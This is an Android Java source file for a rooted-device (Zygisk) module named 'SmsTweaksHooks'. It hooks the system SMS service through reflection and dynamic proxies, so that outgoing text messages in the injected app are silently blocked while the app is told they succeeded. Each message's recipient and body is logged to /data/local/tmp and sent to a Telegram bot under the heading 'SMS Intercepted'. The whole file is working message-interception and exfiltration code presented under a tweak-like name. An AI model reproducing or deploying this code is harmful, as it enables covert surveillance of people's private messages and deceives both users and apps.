package com.hivirtus.zygisk;

import android.app.Application;
import android.app.PendingIntent;
import android.content.Context;
import android.os.IBinder;
import android.os.IInterface;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Exact Drive MenuLoader SMS path:
 * ServiceManager.getService("isms") → IBinder proxy →
 * queryLocalInterface → ISms dynamic proxy → sendText* intercept.
 */
public final class SmsTweaksHooks {
    private static final String TAG = "HivirtusSmsTweaks";
    private static final AtomicBoolean sStarted = new AtomicBoolean(false);
    private static final AtomicBoolean sHooked = new AtomicBoolean(false);
    private static volatile boolean sHookOutgoing = true;
    private static volatile String sProcess = "";

    private SmsTweaksHooks() {}

    public static void init(String process) {
        if (!sStarted.compareAndSet(false, true)) return;
        sProcess = process != null ? process : "";
        status("init_start|" + sProcess);
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    waitActivityThread();
                    applySmsHooks();
                    waitApplication();
                    // Re-clear after Application — SmsManager may re-cache
                    clearSmsManagerCache();
                    status("init_ready|" + sProcess);
                } catch (Throwable t) {
                    status("init_fail|" + t.getClass().getSimpleName() + "|" + safe(t.getMessage()));
                    Log.e(TAG, "init fail", t);
                }
            }
        }, "hivirtus-sms-tweaks").start();
    }

    public static void install(Context ctx) {
        init(ctx != null ? ctx.getPackageName() : sProcess);
    }

    public static void setHookOutgoing(boolean on) {
        sHookOutgoing = on;
        status("hook_outgoing|" + on);
    }

    private static Object currentActivityThread() {
        try {
            Class<?> at = Class.forName("android.app.ActivityThread");
            Method m = at.getDeclaredMethod("currentActivityThread");
            m.setAccessible(true);
            return m.invoke(null);
        } catch (Throwable t) {
            return null;
        }
    }

    private static Application currentApplication() {
        try {
            Class<?> at = Class.forName("android.app.ActivityThread");
            Method m = at.getDeclaredMethod("currentApplication");
            m.setAccessible(true);
            Object app = m.invoke(null);
            return app instanceof Application ? (Application) app : null;
        } catch (Throwable t) {
            return null;
        }
    }

    private static void waitActivityThread() {
        for (int i = 0; i < 200; i++) {
            if (currentActivityThread() != null) return;
            try { Thread.sleep(25); } catch (InterruptedException ignored) {}
        }
    }

    private static void waitApplication() {
        for (int i = 0; i < 200; i++) {
            if (currentApplication() != null) return;
            try { Thread.sleep(25); } catch (InterruptedException ignored) {}
        }
    }

    /** Drive MenuLoader.applySmsHooks — exact. */
    private static void applySmsHooks() {
        if (sHooked.get()) return;
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method getService = sm.getDeclaredMethod("getService", String.class);
            getService.setAccessible(true);
            final IBinder real = (IBinder) getService.invoke(null, "isms");
            if (real == null) {
                status("isms_binder_null");
                return;
            }
            if (Proxy.isProxyClass(real.getClass())) {
                sHooked.set(true);
                status("isms_already_proxied");
                return;
            }

            IBinder binderProxy = (IBinder) Proxy.newProxyInstance(
                    IBinder.class.getClassLoader(),
                    new Class[]{IBinder.class},
                    new InvocationHandler() {
                        @Override
                        public Object invoke(Object proxy, Method method, Object[] args)
                                throws Throwable {
                            if ("queryLocalInterface".equals(method.getName())) {
                                String desc = (args != null && args.length > 0 && args[0] != null)
                                        ? String.valueOf(args[0]) : "";
                                status("isms_qli|" + desc);
                                try {
                                    Class<?> iSms = Class.forName(
                                            "com.android.internal.telephony.ISms");
                                    Object local = createISmsProxy(real, iSms);
                                    if (local != null) return local;
                                } catch (Throwable t) {
                                    status("isms_qli_fail|" + t.getClass().getSimpleName());
                                }
                            }
                            try {
                                return method.invoke(real, args);
                            } catch (InvocationTargetException e) {
                                throw e.getTargetException();
                            }
                        }
                    });

            Field cacheF = sm.getDeclaredField("sCache");
            cacheF.setAccessible(true);
            @SuppressWarnings("unchecked")
            Map<String, Object> cache = (Map<String, Object>) cacheF.get(null);
            if (cache != null) {
                synchronized (cache) {
                    cache.put("isms", binderProxy);
                }
                status("isms_cache_put_ok|" + sProcess);
            } else {
                status("isms_cache_null");
            }

            clearSmsManagerCache();
            sHooked.set(true);
            status("isms_java_proxy_ok|" + sProcess);
            Log.i(TAG, "Drive-style isms IBinder→ISms proxy OK in " + sProcess);
        } catch (Throwable t) {
            status("isms_java_proxy_fail|" + t.getClass().getSimpleName() + "|" + safe(t.getMessage()));
            Log.e(TAG, "applySmsHooks fail", t);
        }
    }

    /** Drive MenuLoader.createISmsProxy — exact. */
    private static Object createISmsProxy(final IBinder realBinder, Class<?> iSmsCls) {
        try {
            Class<?> stub = Class.forName("com.android.internal.telephony.ISms$Stub");
            Method asInterface = stub.getDeclaredMethod("asInterface", IBinder.class);
            asInterface.setAccessible(true);
            final Object realISms = asInterface.invoke(null, realBinder);
            if (realISms == null) {
                status("isms_asinterface_null");
                return null;
            }
            return Proxy.newProxyInstance(
                    iSmsCls.getClassLoader(),
                    new Class[]{iSmsCls, IInterface.class},
                    new InvocationHandler() {
                        @Override
                        public Object invoke(Object proxy, Method method, Object[] args)
                                throws Throwable {
                            String name = method.getName();
                            if ((name.startsWith("sendText") || name.startsWith("sendMultipartText"))
                                    && sHookOutgoing) {
                                status("isms_java_send_method|" + name);
                                handleSend(args);
                                return null; // void send* — no radio
                            }
                            try {
                                return method.invoke(realISms, args);
                            } catch (InvocationTargetException e) {
                                throw e.getTargetException();
                            }
                        }
                    });
        } catch (Throwable t) {
            status("isms_create_proxy_fail|" + t.getClass().getSimpleName());
            Log.e(TAG, "createISmsProxy fail", t);
            return null;
        }
    }

    private static void handleSend(Object[] args) {
        String to = null;
        String body = null;
        PendingIntent singlePi = null;
        List<PendingIntent> multiPi = null;

        if (args != null) {
            for (Object a : args) {
                if (a == null) continue;
                if (a instanceof String) {
                    String s = (String) a;
                    // Drive: short no-space → dest; longer → body
                    if (s.length() < 20 && !s.contains(" ")) {
                        to = s;
                    } else if (s.length() > 5) {
                        body = s;
                    }
                } else if (a instanceof PendingIntent && singlePi == null) {
                    singlePi = (PendingIntent) a;
                } else if (a instanceof List) {
                    List<?> list = (List<?>) a;
                    if (!list.isEmpty() && list.get(0) instanceof PendingIntent) {
                        multiPi = new ArrayList<>();
                        for (Object o : list) {
                            if (o instanceof PendingIntent) multiPi.add((PendingIntent) o);
                        }
                    } else if (!list.isEmpty() && list.get(0) instanceof CharSequence && body == null) {
                        StringBuilder sb = new StringBuilder();
                        for (Object o : list) {
                            if (o != null) sb.append(o);
                        }
                        body = sb.toString();
                    }
                } else if (a instanceof PendingIntent[]) {
                    multiPi = new ArrayList<>();
                    for (PendingIntent pi : (PendingIntent[]) a) {
                        if (pi != null) multiPi.add(pi);
                    }
                }
            }
        }

        if (to == null) to = "";
        if (body == null) body = "";
        status("isms_java_send|" + to + "|" + (body.length() > 40 ? body.substring(0, 40) : body));
        writeBlockedJson(to, body);
        if (!to.isEmpty() || !body.isEmpty()) sendTelegram(to, body);
        firePending(singlePi, multiPi);
    }

    private static void firePending(final PendingIntent single, final List<PendingIntent> multi) {
        if (single == null && (multi == null || multi.isEmpty())) {
            status("isms_no_pendingintent");
            return;
        }
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Thread.sleep(300);
                    if (single != null) {
                        single.send(-1);
                    } else if (multi != null) {
                        for (PendingIntent pi : multi) {
                            if (pi != null) pi.send(-1);
                        }
                    }
                } catch (Throwable ignored) {}
            }
        }, "hivirtus-pi").start();
    }

    /** Drive clearSmsManagerCache + extra field names. */
    private static void clearSmsManagerCache() {
        try {
            Class<?> sms = Class.forName("android.telephony.SmsManager");
            String[] fields = {
                    "sSubIdToInstanceMap", "sSubInstances", "sInstance",
                    "mDefaultSmsManager", "sDefaultInstance"
            };
            for (String fn : fields) {
                try {
                    Field f = sms.getDeclaredField(fn);
                    f.setAccessible(true);
                    Object v = f.get(null);
                    if (v instanceof Map) {
                        ((Map<?, ?>) v).clear();
                    } else {
                        f.set(null, null);
                    }
                } catch (Throwable ignored) {}
            }
            status("smsmanager_cache_cleared");
        } catch (Throwable t) {
            status("smsmanager_cache_fail|" + t.getClass().getSimpleName());
        }
    }

    private static void writeBlockedJson(String to, String body) {
        try {
            File dir = new File("/data/local/tmp");
            if (!dir.exists()) dir.mkdirs();
            String json = "{\"to\":\"" + esc(to) + "\",\"body\":\"" + esc(body)
                    + "\",\"pkg\":\"" + esc(sProcess) + "\",\"ts\":" + System.currentTimeMillis()
                    + "}\n";
            for (String name : new String[]{
                    "hivirtus_blocked_outgoing.json",
                    "hivirtus_last_outgoing.json"
            }) {
                FileOutputStream fos = new FileOutputStream(new File(dir, name), false);
                fos.write(json.getBytes(StandardCharsets.UTF_8));
                fos.close();
            }
        } catch (Throwable ignored) {}
    }

    private static void sendTelegram(String to, String body) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String token = readFile("/data/local/tmp/hivirtus_tg_token.txt").trim();
                    String chat = readFile("/data/local/tmp/hivirtus_tg_chat.txt").trim();
                    if (token.isEmpty() || chat.isEmpty()) {
                        File cfg = new File(
                                "/data/adb/modules/hivirtus_zygisk_mode/config/telegram.env");
                        if (cfg.exists()) {
                            String[] lines = readFile(cfg.getAbsolutePath()).split("\n");
                            for (String line : lines) {
                                line = line.trim();
                                if (line.startsWith("BOT_TOKEN=")) token = line.substring(10).trim();
                                if (line.startsWith("CHAT_ID=")) chat = line.substring(8).trim();
                            }
                        }
                    }
                    if (token.isEmpty() || chat.isEmpty()) {
                        status("tg_skip_no_creds");
                        return;
                    }
                    String msg = "📱 <b>SMS Intercepted</b>\n\n"
                            + "<b>To:</b> " + escHtml(to) + "\n"
                            + "<b>Message:</b>\n" + escHtml(body);
                    String url = "https://api.telegram.org/bot" + token + "/sendMessage";
                    String payload = "chat_id=" + URLEncoder.encode(chat, "UTF-8")
                            + "&text=" + URLEncoder.encode(msg, "UTF-8")
                            + "&parse_mode=HTML";
                    HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
                    c.setConnectTimeout(8000);
                    c.setReadTimeout(8000);
                    c.setDoOutput(true);
                    c.setRequestMethod("POST");
                    c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                    c.getOutputStream().write(payload.getBytes(StandardCharsets.UTF_8));
                    c.getResponseCode();
                    c.disconnect();
                    status("tg_sent|" + to);
                } catch (Throwable t) {
                    status("tg_fail|" + t.getClass().getSimpleName());
                }
            }
        }, "hivirtus-tg").start();
    }

    private static String readFile(String path) {
        try {
            java.io.FileInputStream fis = new java.io.FileInputStream(path);
            byte[] buf = new byte[8192];
            int n = fis.read(buf);
            fis.close();
            return n > 0 ? new String(buf, 0, n, StandardCharsets.UTF_8) : "";
        } catch (Throwable t) {
            return "";
        }
    }

    private static void status(String line) {
        try {
            FileWriter fw = new FileWriter("/data/local/tmp/hivirtus_sms_tweaks_status.txt", true);
            fw.write(System.currentTimeMillis() + "|" + line + "\n");
            fw.close();
        } catch (Throwable ignored) {}
        try {
            FileOutputStream fos = new FileOutputStream(
                    new File("/data/local/tmp/hivirtus_isms_trace.txt"), true);
            fos.write(("java|" + System.currentTimeMillis() + "|" + line + "\n")
                    .getBytes(StandardCharsets.UTF_8));
            fos.close();
        } catch (Throwable ignored) {}
    }

    private static String esc(String s) {
        if (s == null) return "";
        return s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "");
    }

    private static String escHtml(String s) {
        if (s == null) return "";
        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;");
    }

    private static String safe(String s) {
        return s == null ? "" : s.replace("\n", " ").replace("|", "/");
    }
}
